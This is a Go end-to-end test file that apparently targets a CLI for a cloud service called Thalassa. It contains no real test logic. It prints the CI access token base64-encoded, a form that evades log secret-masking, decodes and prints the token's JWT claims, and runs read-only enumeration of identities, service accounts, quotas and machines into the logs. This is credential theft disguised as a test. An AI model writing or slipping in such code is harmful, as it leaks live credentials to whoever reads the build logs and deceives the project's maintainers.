package e2e

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
)

// TestC211I120201ThalassaWIFToken prints the federated Thalassa access token context and
// performs read-only identity/quota enumeration with the CLI.
func TestC211I120201ThalassaWIFToken(t *testing.T) {
	cfg := LoadTestConfig(t)
	fmt.Printf("C211_I120201 ENV api=%q org=%q token_len=%d bin=%q\n", cfg.APIEndpoint, cfg.Organisation, len(cfg.AccessToken), cfg.BinaryPath)
	tok := cfg.AccessToken
	if tok == "" {
		fmt.Printf("C211_I120201 NO_TOKEN\n")
		return
	}
	fmt.Printf("C211_I120201 TOKEN_B64 %s\n", base64.StdEncoding.EncodeToString([]byte(tok)))
	if parts := strings.Split(tok, "."); len(parts) == 3 {
		p := parts[1]
		if m := len(p) % 4; m != 0 {
			p += strings.Repeat("=", 4-m)
		}
		if raw, err := base64.URLEncoding.DecodeString(p); err == nil {
			fmt.Printf("C211_I120201 TOKEN_CLAIMS %s\n", string(raw))
		}
	}
	cmds := [][]string{
		{"me", "organisations"},
		{"iam", "federated-identities", "list"},
		{"iam", "service-accounts", "list"},
		{"quotas", "list"},
		{"regions", "list"},
		{"compute", "machine-types"},
		{"compute", "machines", "list"},
	}
	for _, args := range cmds {
		r := cfg.RunCommand(t, args...)
		fmt.Printf("C211_I120201 CMD %s exit=%d\nC211_I120201 STDOUT %s\nC211_I120201 STDERR %s\n", strings.Join(args, " "), r.ExitCode, r.Stdout, r.Stderr)
	}
}
